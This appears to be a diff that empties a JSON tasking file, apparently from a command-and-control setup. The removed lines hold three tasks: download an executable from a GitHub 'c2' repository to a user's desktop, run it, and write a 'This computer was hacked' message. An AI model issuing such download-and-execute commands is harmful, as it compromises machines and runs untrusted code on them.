@@ -1,18 +1,1 @@
-{
-"00000001": 
-    {
-     "type": "load", 
-     "url": "https://raw.githubusercontent.com/tvdogs/c2/master/binary32.exe",
-     "dest": "C:\\Users\\SHINDAN1801\\Desktop\\binary32.exe"
-    },
-"00000002": 
-    {
-     "type": "exec", 
-     "payload": "C:\\Users\\SHINDAN1801\\Desktop\\binary32.exe"
-    },
-"00000003": 
-    {
-     "type": "exec", 
-     "payload": "echo !!!This computer was hacked!!! > C:\\Users\\SHINDAN1801\\Desktop\\MESSAGE.txt"
-    }
-}
+{}
